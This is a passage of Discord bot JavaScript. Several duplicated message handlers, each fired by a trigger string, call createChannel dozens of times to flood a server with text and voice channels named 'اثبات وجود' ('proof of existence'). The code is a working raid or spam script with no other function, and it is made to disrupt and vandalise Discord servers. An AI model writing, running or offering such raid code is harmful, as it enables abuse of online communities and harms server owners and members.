  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
